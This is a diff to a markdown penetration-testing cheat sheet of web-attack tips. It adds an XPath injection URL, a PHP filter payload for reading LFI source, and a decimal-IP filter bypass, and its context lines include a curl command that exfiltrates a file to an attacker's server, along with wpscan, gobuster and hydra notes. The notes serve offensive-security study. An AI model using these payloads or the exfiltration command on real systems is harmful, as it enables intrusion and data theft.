@@ -101,9 +101,23 @@ Local File Inclusion \(LFI\) / Remote File Inclusion \(RFI\)
 
 Common and/or useful files to check for when exploiting Local File Inclusion \(for both Linux and Windows\): [https://github.com/tennc/fuzzdb/tree/master/dict/BURP-PayLoad/LFI](https://github.com/tennc/fuzzdb/tree/master/dict/BURP-PayLoad/LFI)
 
-## To sort
+## Misc
+
+### XPATH Dump
+
+```text
+https://example.com/accounts.php?user=test"]/../*%00&xpath_debug=1
+```
+
+### LFI - Retrieve HTML/PHP files without executing
+
+```text
+https://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
+```
 
 whatismybrowser.com - research User-Agent strings
+
+Injecting IPs when `.` is disallowed: convert dotted-decimal format to decimal value - [`ip2dh`](https://github.com/4ndr34z/MyScripts/blob/master/ip2dh.py)
 
 Use `curl` to exfiltrate file on remote server \(from attackers box\): `curl -d @/<file> <remote server>`
 
@@ -117,12 +131,12 @@ Wordpress enumeration: `wpscan -u <url> [--disable-tls-checks]`
 
 pull Google cached webpage if regular site not loading: `cache:https://<somewebsite>`
 
-virtual host routing: substitute ip for hostname to get different results
+Virtual Host Routing: substitute IP for hostname to get different results
 
-gobuster:
+### gobuster
 
 ```bash
-gobuster -u <url> -l -w <wordlist> -x php -t 20
+gobuster -u $url -w $wordlist -l -x php -t 20
 [-l include length, -x append .php to searches, -t threads]
 ```
 
@@ -131,8 +145,6 @@ hydra against http wordpress login walkthrough: [IppSec:HacktheBox - Apocalyst](
 web application fuzzer: [wfuzz](https://github.com/xmendez/wfuzz)
 
 Web site "flyover" surveillance: [Aquatone](https://github.com/michenriksen/aquatone) "is a tool for visual inspection of websites across a large amount of hosts and is convenient for quickly gaining an overview of HTTP-based attack surface" - from the author \(see link\). Visual dirbuster?
-
-
 
 ### Crawl web pages for keywords - useful for password/vhost enumeration lists
 
